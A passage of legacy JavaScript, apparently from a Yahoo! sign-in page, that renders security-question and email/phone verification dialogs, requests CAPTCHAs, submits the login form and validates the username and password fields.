		    if(YAHOO.util.Dom.hasClass(id, "nodisp")){
                YAHOO.util.Dom.removeClass(id, "nodisp");
                YAHOO.util.Dom.addClass(id, "showdisp");
		    } else {
                YAHOO.util.Dom.removeClass(id,"showdisp");
                YAHOO.util.Dom.addClass(id,"nodisp");
		    }
		}

		function hideSecChalPopup(e, id) {
		    if(YAHOO.util.Dom.hasClass(id,'showdisp')){
                YAHOO.util.Dom.removeClass(id,'showdisp');
                YAHOO.util.Dom.addClass(id,'nodisp'); 
		    }
		}
        YAHOO.membership = YAHOO.membership || {};
        YAHOO.membership.cpcwToggle = function (context) {
            if(context.reason == "postcreate") {
                var mainDiv = document.createElement("div");
                mainDiv.id = "submitC";

                if (document.getElementById('captchaV5ErrorMessage') != null) {
                    cPanel.setHeader(secChalStr.svc_unavilable);
                    mainDiv.innerHTML = '<div id="cdiv"><button id="cpwcVerifyCode" type="submit" name="cpwcVerifyCode" class="primaryCta" onclick="closeCaptchaWindow()" tabindex="5">'+secChalStr.sec_chal_close+'</button></div>';
                } else {
                    mainDiv.innerHTML = '<div id="cdiv"><button id="cpwcVerifyCode" type="submit" name="cpwcVerifyCode" class="primaryCta" tabindex="5">'+secChalStr.sec_chal_enter_code+'</button></div>';
                }

                var captchaDiv = YAHOO.util.Dom.get("captchaV5");
                captchaDiv.appendChild(mainDiv);
            }
        }

        function showSecondChallenge(jsonResult) {
            result =  YAHOO.lang.JSON.parse(jsonResult.challenge_data);
            var zValue = result.z;
            var sub_code = (jsonResult.sub_code != null) ? jsonResult.sub_code : null;
            pwqaPresent=0; aeaPresent = 0;
            for(var i=0;i<result.challenges.length;i++) {
                s_result[i] = result.challenges[i];
                if (s_result[i].type == 1) {
                    pwqaPresent = 1;
                } else if (s_result[i].type == 3 || s_result[i].type == 4) {
                    aeaPresent = 1;
                }
            }
            //Sort by priority                                        
            for(i=0;i<s_result.length;i++) {
                imin = i;
                for(j=i+1;j<s_result.length;j++) {
                    if(s_result[j].priority < s_result[imin].priority) {
                        imin = j;       
                    }
                }
                tmp = s_result[i];
                s_result[i] = s_result[imin];
                s_result[imin] = tmp;
            }
            //Based on 'type' field display PWQA or AEA first
            secondChalJson = s_result;
            if(sub_code !== null) {
                switch(sub_code) {
                    //PWQA wrong answer
                    case '9997':
                        if(s_result[0].type === 1 && pwqaPresent == 1) { 
                            showPWQA(s_result[0], zValue, 1, "9997"); 
                        } else if(aeaPresent == 1) {
                            showAEA(s_result, zValue, 0, "9997");
                        } else {
                            showUserLocked();
                        }
                    break;
                    //Email wrong verification code
                    case '9996':
                        if(aeaPresent == 1) {
                            showVerify("EMAIL", zValue, verifyJson, selEmail, "9996");
                        } else if(pwqaPresent == 1) {
                            showPWQA(s_result[0], zValue, 0, "9995");
                        } else {
                            showUserLocked();
                        }
                    break;
                    //Phone wrong verification code
                    case '9995':
                        if(aeaPresent == 1) {
                            showVerify("PHONE", zValue, verifyJson, '', "9995");
                        } else if(pwqaPresent == 1) {
                            showPWQA(s_result[0], zValue, 0, "9995");
                        } else {
                            showUserLocked();
                        }
                    break;
                    //Phone communication error - temporary
                    case '9994':
                        showAEA(s_result, zValue, 0, "9994");
                    break;
                    default:
                        if(s_result[0].type == 4 || s_result[0].type == 3) {
                            showAEA(s_result, zValue, 1);                
                        } else if(s_result[0].type == 1) {
                            showPWQA(s_result[0], zValue, 1);
                        }
                    break;
                }
            }
        }
        
        function digitToMonth(date) {            
            if(date) {                
                switch(date) {                    
                    case 1:                        
                        return 'January'; 
                    break;
                    case 2: 
                        return 'February';
                    break;
                    case 3:
                        return 'March';
                    break;
                    case 4:
                        return 'April';
                    break;
                    case 5:
                        return 'May';
                    break;
                    case 6:
                        return 'June';
                    break;
                    case 7:
                        return 'July';
                    break;
                    case 8:
                        return 'August';
                    break;
                    case 9:
                        return 'September';
                    break;
                    case 10:
                        return 'October';
                    break;
                    case 11:
                        return 'November';
                    break;
                    case 12:
                        return 'December';
                    break;
                    default:
                        return null; 
                }
            } else {
                return null;
            }
        } 

        function showPWQA(resJson, zValue, showAEABtn, error) {
            res = resJson.data;
            question = res[0];
            addedDateTs = new Date(resJson.ts*1000);
            addedDate = secChalStr.added_date_format;
            addedDate = addedDate.replace("{month}",digitToMonth(addedDateTs.getMonth()+1));
            addedDate = addedDate.replace("{day}", addedDateTs.getDate());
            addedDate = addedDate.replace("{year}", addedDateTs.getFullYear());

            //cPanel.cfg.setProperty("height", "380px");
            cPanel.setHeader(secChalStr.sec_chal_header+secChalStr.pwqa_header);
            panelBody = '<div id="pwqaErr" class="error2"></div><div class="pwqaContent" id="pwqaContent"><div class="sec-chal-popup nodisp" id="pwqa-popup"><div id="pwqa_popup_content" class="sec-chal-content"><span class="pointer-up"></span><a class="clspopup"><span class="hide-offscreen">'+secChalStr.sec_chal_close+'</span></a><p><span class="strong">'+secChalStr.why_recognize+'</span></p><p><ul><li>'+secChalStr.why_point_one+'</li><li>'+secChalStr.why_point_two+'</li><li>'+secChalStr.why_point_three+'</li></ul></p></div></div><span class="strong">'+secChalStr.pwqa_content+'</span><span class="next-line">'+secChalStr.pwqa_content_next_line+'</span><div class="pwqa-question"><span>'+question+'<br><span class="small">'+addedDate+'</span></span><input type="input" name=".2ndChallenge_pwqa_ans_in" id=".2ndChallenge_pwqa_ans_in" autocomplete="off" style="width:125px;"></div><input type="hidden" name=".z" id=".z" value='+zValue+'><input type="hidden" name=".2ndChallenge_type_in" id=".2ndChallenge_type_in" value="1"><input type="hidden" id=".2ndChallenge_pwqa_quest_in" name=".2ndChallenge_pwqa_quest_in" value="'+question+'"><div id="verifybtn"><button id=".savePWQA" type="submit" name=".savePWQA" class="primaryCta" tabindex="5">'+secChalStr.pwqa_verify_answer+'</button></div>';
            for(i=0;i<secondChalJson.length;i++) {
                if(secondChalJson[i].type === "3") {
                    aeaJson = secondChalJson[i];
                }
                if(secondChalJson[i].type === "2") {
                    pwqaJsoe = secondChalJson[i].data;                                        
                }
            }       
            if(showAEABtn == 1) {
                if(aeaPresent == 1) {
                    panelBody += '<div class="pwqa-aea-text"><div class="center"><span class="lthru">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="or">&nbsp; '+secChalStr.sec_chal_or+'&nbsp; </span><span class="lthru">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div>'+secChalStr.pwqa_content_aea_text+'<div id="receivebtn">';
                    panelBody += '<button id=".sendVC" name=".sendVC" class="primaryCta" tabindex="6" type="button" onclick="showAEA(s_result, \''+zValue+'\', 0)">'+secChalStr.pwqa_show_verification_cta+'</button>';
                }
            } else if(aeaPresent == 1) {
                panelBody += '<button id=".backVC" name=".backVC" class="primaryCta" tabindex="7" type="button" onclick="showAEA(s_result, \''+zValue+'\', 1)">'+secChalStr.sec_chal_back+'</button>';
            }       
            panelBody += '</div></div></div>';
            cPanel.setBody(panelBody);
            cPanel.render("captchaDiv");
            document.getElementById('pwqaErr').style.display = 'none';
            if(error !== null) {
                switch(error) {
                    case "9997": 
                        document.getElementById('pwqaErr').innerHTML = secChalStr.pwqa_wrong_answer;
                        document.getElementById('pwqaErr').style.display = '';
                    break;
                    case "9995":
                        document.getElementById('pwqaErr').innerHTML = secChalStr.aea_locked_msg;
                        document.getElementById('pwqaErr').style.display = '';
                    break;
                }
            }
            YAHOO.util.Event.addListener(document, "click", hideSecChalPopup, "pwqa-popup");            
            YAHOO.util.Event.addListener("pwqa_why_popup", "click", function(e){                
                e.cancelBubble = true;
            if (e.stopPropagation) e.stopPropagation();                
                YAHOO.util.Event.preventDefault(e);
                showSecChalPopup("pwqa-popup");
                YAHOO.util.Event.addListener(YAHOO.util.Dom.getElementsByClassName("clspopup"), "click", hideSecChalPopup, "pwqa-popup"); 
            });
            cPanel.showMask();                
            cPanel.show();
            var answerBox = document.getElementById('.2ndChallenge_pwqa_ans_in');
            answerBox.focus();
            answerBox.select();
            answerBox.tabIndex = 0;
            document.getElementById('.savePWQA').tabIndex = 0;
            if(document.getElementById('.sendVC') != null) {
                document.getElementById('.sendVC').tabIndex = 0;
            }
            cPanel.setFirstLastFocusable();
        }      

        function showAEA(resJson, zValue, showPWQABtn, error) {
            cPanel.setHeader(secChalStr.sec_chal_header+secChalStr.aea_header); 
            //cPanel.cfg.setProperty("height", "380px");
            var validPWQA = 0;
            for(i=0;i<resJson.length;i++){
                if (resJson[i].type == 1) {
                    validPWQA = 1;
                }
                if (resJson[i].type == 4) {
                    var aea = resJson[i].data;
                } else if (resJson[i].type == 3) {
                    var mobile = resJson[i].data;
                }
            }
            var lrn_three_txt = secChalStr.aea_learn_more_content_para_three;
            if(navigator.userAgent.indexOf('Firefox/6') > 0) {
                style = '';            
            } else {
                style = "left:70px;";            
            }
            lrn_three_txt = lrn_three_txt.replace('{learn_link}',secChalStr.learn_more_link);
            var panelBody = '<div id="aeaErr" class="error2"></div><div class="aeaContent"><div class="sec-chal-popup nodisp" id="pwqa-popup"><div id="pwqa_popup_content" class="sec-chal-content"><span class="pointer-up"></span><a class="clspopup"><span class="hide-offscreen">'+secChalStr.sec_chal_close+'</span></a><p><span class="strong">'+secChalStr.why_recognize+'</span></p><p><ul><li>'+secChalStr.why_point_one+'</li><li>'+secChalStr.why_point_two+'</li><li>'+secChalStr.why_point_three+'</li></ul></p></div></div><span class="strong">'+secChalStr.pwqa_content+'</span><span class="aea-next-line" style="display:block;">'+secChalStr.aea_content+' <a href="" id="aea-learn-more">'+secChalStr.aea_learn_more+'</a></span><div class="sec-chal-popup nodisp" id="learn-more-popup"><div id="learn_more_content" class="sec-chal-content"><span class="pointer-up" style='+style+'></span><a class="clspopup"><span class="hide-offscreen">close</span></a><p>'+secChalStr.aea_learn_more_content_para_one+'</p><p class="strong">'+secChalStr.aea_learn_more_content_para_two+'</p><p>'+lrn_three_txt+'</p></div></div>';
            if(mobile !== undefined) {
                if(mobile.length > 0) {
                    panelBody += '<div class="mobileList"><div class="bm">'+secChalStr.aea_by_phone+'</div><ul>';
                    for(var i=0; i<mobile.length; i++) {
                        mnumber = mobile[i][i];
                        stl = '';
                        if(YAHOO.env.ua.ie == 6 && i==0) {
                                stl = ' style="margin-left:-3px;"';
                        }
                        mobileMarkup = '<li' + stl + '><input name="aeaSelect" type="radio" id="aeaSelectSMS'+i+'" style="width:15px;" class="aeaSelect" rel="3|'+i+'|'+mnumber+'|SMS">'+secChalStr.aea_sms_text+' <span class="spacer"></span><input name="aeaSelect" type="radio" id="aeaSelectVoice'+i+'" style="width:15px;" rel="3|'+i+'|'+mnumber+'|CALL">'+secChalStr.aea_voice+' <span class="strong"><span>|</span> '+mnumber+'</span></li>';
                        panelBody += mobileMarkup;
                        if(i>=2){
                            break;
                        }
                    }
                    panelBody += '</ul></div>';
                }
            }

            if(aea !== undefined) { 
                if(aea.length > 0) {
                    panelBody += '<div class="aeaList"><div class="be">'+secChalStr.aea_by_email+'</div><ul>';
                    for(var i=0; i<aea.length; i++) {
                        email = aea[i][i];
                        stl = '';
                        if(YAHOO.env.ua.ie == 6 && i==0) {
                                stl = ' style="margin-left:-3px;"';
                        }
                        emailMarkup = '<li' + stl + '><input name="aeaSelect" id="aeaSelectEmail'+i+'" type="radio" style="width:15px;" class="aeaSelect" rel="4|'+i+'|'+email+'|EMAIL">'+email+'</li>';
                        panelBody += emailMarkup;
                        if(i>=2){
                            break;
                        }
                    }
                    panelBody += '</ul></div>';
                }
            }
            panelBody += '<div id="submitC"><input type="hidden" name=".z" id=".z" value='+zValue+'><div id="cdiv"><button id=".sendAEA" type="button" name=".sendAEA" class="primaryCta" tabindex="5">'+secChalStr.aea_receive_code+'</button>';
            for(i=0;i<secondChalJson.length;i++) {
                if(secondChalJson[i].type == 1) {
                    pwqaJson = secondChalJson[i];
                }                                        
                if(secondChalJson[i].type == 3) {
                    aeaJson = secondChalJson[i];
                }                                        
            } 
            if(showPWQABtn == 1) {
                if(!pwqaJson) {
                    panelBody += '<button id="showPWQABtn" name="showPWQABtn" class="secondaryCta" tabindex="6" type="button" onclick="showPWQA(pwqaJson, \''+zValue+'\', 0)">Show PWQA</button>';
                }
            } else {
                if(validPWQA) {
                    panelBody += '<button id=".backPWQA" name=".backPWQA" class="secondaryCta" tabindex="6" type="button" onclick="showPWQA(pwqaJson, \''+zValue+'\', 1)">'+secChalStr.sec_chal_back+'</button>';
                }
            }
            panelBody += '</div></div></div>';            
            cPanel.setBody(panelBody);
            cPanel.render("captchaDiv");
            cPanel.showMask();                
            cPanel.show();

            YAHOO.util.Event.addListener(document, "click", hideSecChalPopup, "pwqa-popup");
            YAHOO.util.Event.addListener("pwqa_why_popup", "click", function(e){            
                e.cancelBubble = true;                                
                if (e.stopPropagation) e.stopPropagation();
                YAHOO.util.Event.preventDefault(e);
                showSecChalPopup("pwqa-popup");
                YAHOO.util.Event.addListener(YAHOO.util.Dom.getElementsByClassName("clspopup"), "click", hideSecChalPopup, "pwqa-popup");
                hideSecChalPopup(null, "learn-more-popup");
            });

            YAHOO.util.Event.addListener(document, "click", hideSecChalPopup, "learn-more-popup");
            YAHOO.util.Event.addListener("aea-learn-more", "click", function(e){
                e.cancelBubble = true;
                if (e.stopPropagation) e.stopPropagation();
                YAHOO.util.Event.preventDefault(e);
                showSecChalPopup("learn-more-popup");
                YAHOO.util.Event.addListener(YAHOO.util.Dom.getElementsByClassName("clspopup"), "click", hideSecChalPopup, "learn-more-popup"); 
            });

            document.getElementById('aeaErr').style.display = "none";
            var adjust = YAHOO.util.Dom.getElementsByClassName("mobileList")[0];

            if(error) {
                switch(error) {
                    case '9997':
                        document.getElementById('aeaErr').innerHTML = secChalStr.aea_err_pwqa_locked;
                        break;
                    case '9994':
                        document.getElementById('aeaErr').innerHTML = secChalStr.aea_err_not_delivered;
                        break;
                    default:
                        document.getElementById('aeaErr').innerHTML = secChalStr.aea_err_not_delivered;
                        break;
                }
                document.getElementById('aeaErr').style.display = "";
                YAHOO.util.Dom.addClass(adjust, "adjust-margin");
            } else {
                YAHOO.util.Dom.removeClass(adjust, "adjust-margin");
            }
            YAHOO.util.Event.addListener('.sendAEA', 'click', function(){
                createAEA();
            });
            var select = YAHOO.util.Dom.getElementsByClassName('aeaSelect')[0];
            select.focus();
            select.select();
            if(mobile !== undefined) {
                for(var i=0; i<mobile.length; i++) {  
                    document.getElementById("aeaSelectVoice"+i).tabIndex = 0;
                    document.getElementById("aeaSelectSMS"+i).tabIndex = 0;
                } 
            }
            if(aea !== undefined) {
                for(var i=0; i<aea.length; i++) {
                    document.getElementById("aeaSelectEmail"+i).tabIndex = 0;
                }
            }
            document.getElementById('.sendAEA').tabIndex = 0;
            if(document.getElementById('.backPWQA') !== null) {
                document.getElementById('.backPWQA').tabIndex = 0;
            }
            cPanel.setFirstLastFocusable();
        }

        function createAEA() {
            var uri = '/config/login_unlock';
            var zValue = document.getElementById(".z").value;
            var params = "?z="+zValue, val=null;
            if(document.login_form.aeaSelect.length === undefined) {
                if(document.login_form.aeaSelect.checked) {
                    rel = document.login_form.aeaSelect.getAttribute('rel');
                    sp = rel.split('|');
                    params += "&c_type="+sp[0];
                    params += "&c_idx="+sp[1];
                    val = sp[2];
                    params += "&c_stype="+sp[3];
                }       
            } else {
                for(var i = 0; i < document.login_form.aeaSelect.length; i++) {
                    if(document.login_form.aeaSelect[i].checked) {
                        rel = document.login_form.aeaSelect[i].getAttribute('rel');
                        sp = rel.split('|');
                        params += "&c_type="+sp[0];
                        params += "&c_idx="+sp[1];
                        val = sp[2];
                        params += "&c_stype="+sp[3];
                    }       
                }
            }
            var adjust = YAHOO.util.Dom.getElementsByClassName("mobileList")[0];

            if(val === null) {
                document.getElementById('aeaErr').innerHTML = secChalStr.aea_err_not_selected;
                document.getElementById('aeaErr').style.display = "";
                YAHOO.util.Dom.addClass(adjust, "adjust-margin");
            } else {
                YAHOO.util.Dom.removeClass(adjust, "adjust-margin");
                document.getElementById('aeaErr').style.display = "none";
                var login = document.getElementById("username").value;
                params += "&login="+login+"&_lang=en-US&_intl=us";
                YAHOO.util.Connect.asyncRequest('GET', uri+params, {
                    cache:false,
                    success : function(o) {         
                        //cPanel.cfg.setProperty("height", "380px");
                        cPanel.setHeader(secChalStr.sec_chal_header+secChalStr.aea_verify_header);
                        var zValue = document.getElementById(".z").value;
                        var resp = YAHOO.lang.JSON.parse(o.responseText); 
                        verifyJson = resp; selEmail = val;
                        showVerify(sp[3], zValue, resp, val);
                    },
                    failure : function(o) {

                    }
                });
            }

        }

        function showVerify(type, zValue, resp, selEmail, error) {
            var parentError = 0;
            if(type == "EMAIL") {
                if(resp.unlock_status == "Z_EXPIRED" || resp.unlock_status == "UDB_FAILURE" || resp.unlock_status == "JSON_PARSE_FAILED") {
                    location = window.location;
                    window.location = location;
                    redirect = 1;
                } else if(resp.unlock_status == "EMAIL_OK") {  
                    var email = secChalStr.aea_email_verify_content;
                    email = email.replace('{email}',selEmail);
                    panelBody = '<div id="aeaVerifyErr" class="error2"></div><div class="aeaEmailVerify"><span class="strong">'+email+'</span><br>'+secChalStr.aea_enter_code+'<div class="aeaEnterCode">'+secChalStr.aea_email_idetification_code+' <span class="spacer"></span><input type="input" name=".2ndChallenge_email_code" id=".2ndChallenge_email_code" style="width:150px;" autocomplete="off"></div><div id="submitC"><input type="hidden" name=".2ndChallenge_type_in" id=".2ndChallenge_type_in" value="4"><input type="hidden" name=".z" id=".z" value='+zValue+'><div id="cdiv"><button id=".sendEmailCode" type="submit" name=".sendEmailCode" class="primaryCta" tabindex="5">'+secChalStr.sec_chal_enter_code+'</button><button id=".aeaBack" name=".aeaBack" class="secondaryCta" tabindex="6" type="button" onclick="showAEA(s_result, \''+zValue+'\', 0)">'+secChalStr.sec_chal_back+'</button></div></div>';
                    redirect = 0;
                } else {
                    parentError = 1;
                    redirect = 0;
                }
            } else {
                if(resp.unlock_status == "Z_EXPIRED" || resp.unlock_status == "UDB_FAILURE" || resp.unlock_status == "JSON_PARSE_FAILED") {
                    location = window.location;
                    window.location = location;
                    redirect = 1;
                } else if(resp.voice_sms_turnkey != null) {
                    var respXML = getXmlDomObj(resp.voice_sms_turnkey); 
                    rootNode = respXML.getElementsByTagName("createResponse")[0];
                    turnKey = isIE ? rootNode.childNodes[1].childNodes[0].text : rootNode.childNodes[3].childNodes[1].textContent;
                    var split = turnKey.split('<script');
                    var script = '<script '+split[1];
                    var html = split[0]+'</div>';
                    html = html.replace('<div id="captchaV5VoiceSMSContent"','<div id="captchaV5VoiceSMSContent" style="padding-top:0px;width:400px"');
                    html = html.replace('<div id="captchaV5VoiceSMSHelp"', '<div id="captchaV5VoiceSMSHelp" style="position:absolute;right:14px;top:40px;"');
                    html = html.replace('<input class="VoiceSMSAnswer" id="captchaV5VoiceSMSAnswer"', '<input class="VoiceSMSAnswer" id="captchaV5VoiceSMSAnswer" tabindex="0"');
                    script = script.split('</div>')[0]; 
                    script = script.replace('<script  type="text/javascript">', "");
                    script = script.replace("<\/script>", "");
                    panelBody = '<div id="aeaVerifyErr" class="error2"></div><div class="aeaPhoneVerify">'+html+'<div id="submitC"><input type="hidden" name=".2ndChallenge_type_in" id=".2ndChallenge_type_in" value="3"><input type="hidden" name=".z" id=".z" value='+zValue+'><div id="cdiv"><button id="verifyCodeBtn" type="submit" name="verifyCodeBtn" class="primaryCta" tabindex="5">'+secChalStr.sec_chal_enter_code+'</button><button id=".aeaBack" name=".aeaBack" class="secondaryCta" tabindex="6" type="button" onclick="showAEA(s_result, \''+zValue+'\', 0)">'+secChalStr.sec_chal_back+'</button></div></div></div>';
                    redirect = 0;
                } else {
                    parentError = 1;
                    redirect = 0;
                }
            }
            if(parentError) {
                showAEA(s_result, zValue, 0, 'error');
            } else if(redirect == 0) {
                cPanel.setBody(panelBody);
                cPanel.render("captchaDiv");
                cPanel.showMask();                
                cPanel.show();
                YAHOO.util.Event.addListener('captcha', "click",function(e){
                    tg = isIE ? e.srcElement : e.target;
                    if(tg.getAttribute("type") == "button" && tg.getAttribute("name") == "VoiceSMSRetry") {
                        setTimeout(function() {
                            document.getElementById("captchaV5VoiceSMSContent").setAttribute("style", "padding-top:0px"); 
                            document.getElementById("captchaV5VoiceSMSHelp").setAttribute("style", "position:absolute;right:14px;top:40px;"); 
                        },2000);
                    }
                });
                if(error) {
                    switch(error) {
                        case '9996':
                        case '9995':
                            document.getElementById('aeaVerifyErr').innerHTML = secChalStr.aea_invalid_code;
                            for(i=0;i<captchaData.length;i++) {
                                if(document.getElementById(captchaData[i].id) != null) {
                                    document.getElementById(captchaData[i].id).value = captchaData[i].value;        
                                }
                            }
                            break;
                        default:
                            document.getElementById('aeaVerifyErr').style.display = "none";
                    }
                } else {
                    document.getElementById('aeaVerifyErr').style.display = "none";
                }
                if(type !== "EMAIL") {
                    removeVoiceCaptchaJS();
                    eval(script);
                    document.getElementById('verifyCodeBtn').tabIndex = 0;
                    document.getElementById('.aeaBack').tabIndex = 0;
               } else {
                    document.getElementById('.2ndChallenge_email_code').focus();
                    document.getElementById('.2ndChallenge_email_code').select();
                    document.getElementById('.2ndChallenge_email_code').tabIndex = 0;
                    document.getElementById('.sendEmailCode').tabIndex = 0;
                    document.getElementById('.aeaBack').tabIndex = 0;
               } 
            }
            cPanel.setFirstLastFocusable();
       }     
        

		function getCv5( ep, yid ) {
		    var epParam = "";
		    if( ep ){
			epParam = "&ep=" + ep;
		    }
		    // yid should not be empty
		    var loginParam = "";
		    if( yid !== "" ) {
			loginParam = "&login="+yid;
		    }
																		
						YAHOO.util.Connect.asyncRequest('GET', "/captcha/CaptchaWSProxyService.php?action=createlazy&initial_view=&.intl=us&.lang=en-US"+epParam+loginParam, callback1);						
					}

        function removeDuplicatePassRaw() {
            if(YAHOO.env.ua.ie > 0) {
                var frmObj = document.getElementById('login_form');
                var inputs = frmObj.getElementsByTagName("input");
                var passwd_raw_fld = new Array();

                for(i = 0, cnt = 0; i < inputs.length; i++) {
                    nm = inputs[i].getAttribute("name");
                    if(nm == "passwd_raw") {
                            passwd_raw_fld[cnt] = inputs[i];
                            cnt++;
                    }
                }
                if(cnt >= 1) {
                    var el = passwd_raw_fld[0];
                    el.parentNode.removeChild(el);
                }
            } else {
                var obj = document.getElementsByName("passwd_raw");
                obj[0].parentNode.removeChild(obj[0]);
            }
        }

		function makerequest() {												
            document.getElementById(".ws").value="1";                       
            var frmObj = document.getElementById('login_form');
            if(document.getElementById('.2ndChallenge_pwqa_ans_in')) {
                if(document.getElementById('.2ndChallenge_pwqa_ans_in').value) {
                    YAHOO.util.Connect.setForm(frmObj);                                             
                    removeDuplicatePassRaw();
                    YAHOO.util.Connect.asyncRequest('POST', "/config/login", callback);
                    document.getElementById("pwqaErr").style.display = "none";
                } else {
                    document.getElementById("pwqaErr").innerHTML = secChalStr.sec_chal_err_no_answer;
                    document.getElementById("pwqaErr").style.display = "";
                }
            } else if(document.getElementById('.2ndChallenge_email_code')) {
                if(document.getElementById('.2ndChallenge_email_code').value) {
                    YAHOO.util.Connect.setForm(frmObj);                                             
                    removeDuplicatePassRaw();
                    YAHOO.util.Connect.asyncRequest('POST', "/config/login", callback);
                    document.getElementById("aeaVerifyErr").style.display = "none";
                } else {
                    document.getElementById("aeaVerifyErr").innerHTML = secChalStr.sec_chal_err_empty_verification;
                    document.getElementById("aeaVerifyErr").style.display = "";
                }
            } else if(document.getElementById('verifyCodeBtn')) {
                //if(document.getElementById('captchaV5VoiceSMSAnswer').value) {
                    /* copy the captcha hidden values */
                    var root = document.getElementById("captchaV5");
                    var captchaInputs = root.getElementsByTagName("input");
                    var cnt = 0; 
                    for(i=0;i<captchaInputs.length;i++) {
                        name = captchaInputs[i].getAttribute("name");
                        id = captchaInputs[i].getAttribute("id");
                        if(name.indexOf("captcha") >= 0) {
                                if(name != "captchaAnswer") { 
                                        captchaData[cnt] = {"id":id, "value":captchaInputs[i].value};
                                        cnt++;
                                }
                        }
                    }
                    document.getElementById(".cp").value = 0;
                    YAHOO.util.Connect.setForm(frmObj);                                             
                    removeDuplicatePassRaw();
                    YAHOO.util.Connect.asyncRequest('POST', "/config/login", callback);
                    document.getElementById("aeaVerifyErr").style.display = "none";
                /*} else {
                    document.getElementById("aeaVerifyErr").innerHTML = secChalStr.sec_chal_err_empty_verification; 
                    document.getElementById("aeaVerifyErr").style.display = "";
                }*/
            } else if(document.getElementById('.sendAEA')) {
                createAEA();
            } else {
                YAHOO.util.Connect.setForm(frmObj);                                             
                removeDuplicatePassRaw();
                YAHOO.util.Connect.asyncRequest('POST', "/config/login", callback);
            }
		}

		function sbmCp(e){
			YAHOO.util.Event.preventDefault(e);
			                YAHOO.membership.checkInputsUI(e,{'username':'username', 'password':'passwd'});
							
		}
		cPanel.showEvent.subscribe(function () {
			document.getElementById(".cp").value="1";
		});
		cPanel.hideEvent.subscribe(function (){
			document.getElementById(".cp").value="0";
		});										 

</script>
<!--[if lte IE 8]>
<script type="text/javascript">
        function chkkey(e){
          if(window.event.keyCode == '13'){
				sbmCp(e);
			}
        }
        var unm= "username";
var ids = [unm, "passwd"];
YAHOO.util.Event.addListener(ids, "keypress",chkkey);
</script>
<![endif]-->


        <script type="text/javascript">
        if (top != self) top.location.href = location.href;

        </script>

        <script type="text/javascript">
var perceivedAd = 1;
var actualAd = perceivedAd;
var timeoutLimit = 4000;
var crumb = "KofUOCkd6Am";
var verify = 0;
var partner = "";
var src = "ym";
var intl = "us";
YAHOO.ads.adWidth = 1920;

//BUG #5775722
var perceivedAd2 = "1";
var actualAd2 = "1";
var baseSpaceID = "150002527";
var intlSpaceID = "150002527";
</script>

<script type='text/javascript'>
browser_string = navigator.appVersion + " " + navigator.userAgent;
if ( browser_string.indexOf("MSIE") < 0 ) {
	if (navigator.mimeTypes) {
		for (i = 0 ; i < navigator.mimeTypes.length ; i++) {
			if (navigator.mimeTypes[i].suffixes.indexOf("yps") > -1) {
				 doGotIt();
			}
		}
	} else {
		dontGotIt();
	}
} else {
	if (browser_string.indexOf("Windows")>=0) {
		doGotIt();
		document.write('<object classid="clsid:41695A8E-6414-11D4-8FB3-00D0B7730277" CODEBASE="javascript:dontGotIt();" ID="Ymsgr" width="1" height="1">');
		document.write('</object>');
	}
}
hasMsgr = 0;
function dontGotIt(){
  hasMsgr = 0;
  document.login_form.hasMsgr.value=0;
}
function doGotIt(){
  hasMsgr = 1;
  document.login_form.hasMsgr.value=1;
}
YAHOO.namespace("membership");
YAHOO.membership.setFocus = function(){
    var p, u = document.getElementById("username");
    if (u && u.tagName.toLowerCase() == "input") {
        u.focus();
    } else if (p = document.getElementById("passwd")) {
        p.focus();
    }
}
YAHOO.util.Event.onDOMReady(YAHOO.membership.setFocus);

if(typeof YAHOO=="undefined"){YAHOO={};}
YAHOO.namespace("membership");
YAHOO.membership.showError = function(toShowText){
    YAHOO.membership.clearError();
    var fs = document.getElementById('fsLogin');
    var errMsg = document.createElement('div');
    errMsg.innerHTML = toShowText;
    errMsg.className = 'yregertxt';
    fs.insertBefore(errMsg, fs.firstChild);
}

YAHOO.membership.showXhrErr = function(toShowText){
    YAHOO.membership.clearError();
			YAHOO.membership.clearYP({'username':'username', 'password':'passwd'});
	    var fs = document.getElementById('fsLogin');
    var errMsg = document.createElement('div');
    errMsg.innerHTML = toShowText;
    errMsg.className = 'yregertxt';
    fs.insertBefore(errMsg, fs.firstChild);
}

YAHOO.membership.showXhrErrWYid = function(toShowText){
    YAHOO.membership.clearError();
			YAHOO.membership.clearYP({'password':'passwd'});
	    var fs = document.getElementById('fsLogin');
    var errMsg = document.createElement('div');
    errMsg.innerHTML = toShowText;
    errMsg.className = 'yregertxt';
    fs.insertBefore(errMsg, fs.firstChild);
}
YAHOO.membership.clearError = function(){
    var errs = YAHOO.util.Dom.getElementsByClassName('yregertxt');
    for(var i=0; i<errs.length; i++){
    errs[i].parentNode.removeChild(errs[i]);
    }
}

YAHOO.membership.clearYP = function(toCheck){
    var id = document.getElementById(toCheck['username']);
    var pw = document.getElementById(toCheck['password']);
	pw.value='';
	YAHOO.util.Dom.setStyle(pw, 'background-color', '');
	if(id!=null && id.type!="hidden"){
		id.value='';
		YAHOO.util.Dom.setStyle(id, 'background-color', '');
		id.focus();
	} else {
		pw.focus();
	}
}

YAHOO.membership.checkInputs = function(e, toCheck){
    var id = document.getElementById(toCheck['username']);
    var pw = document.getElementById(toCheck['password']);
    var pwVal = pw.value;
    if (!id) {
        if (pwVal == '') {
             YAHOO.util.Event.preventDefault(e);
             pw.focus();
             YAHOO.util.Dom.setStyle(id, 'background-color', '#ffefef');
             YAHOO.membership.showError('<strong>Please enter your password</strong>');
        }
    } else {
        var idVal = id.value;
        if (pwVal == '' && idVal == ''){
            YAHOO.util.Event.preventDefault(e);
            YAHOO.util.Dom.setStyle(pw, 'background-color', '#ffefef');
            YAHOO.util.Dom.setStyle(id, 'background-color', '#ffefef');
            YAHOO.membership.showError('<strong>Invalid ID or password.</strong><br/> Please try again using your full Yahoo! ID.');
            id.focus();
          }else if(pwVal == '' && idVal != ''){
            YAHOO.util.Event.preventDefault(e);
            pw.focus();
            YAHOO.util.Dom.setStyle(id, 'background-color', '');
            YAHOO.util.Dom.setStyle(pw, 'background-color', '#ffefef');
            YAHOO.membership.showError('<strong>Please enter your password</strong>');
          }else if(pwVal != '' && idVal == ''){
            YAHOO.util.Event.preventDefault(e);
            id.focus();
            YAHOO.util.Dom.setStyle(id, 'background-color', '#ffefef');
            YAHOO.util.Dom.setStyle(pw, 'background-color', '');
            YAHOO.membership.showError('<strong>Please verify your Yahoo! ID</strong>');
          }
    }
}

YAHOO.membership.checkInputsUI = function(e, toCheck){
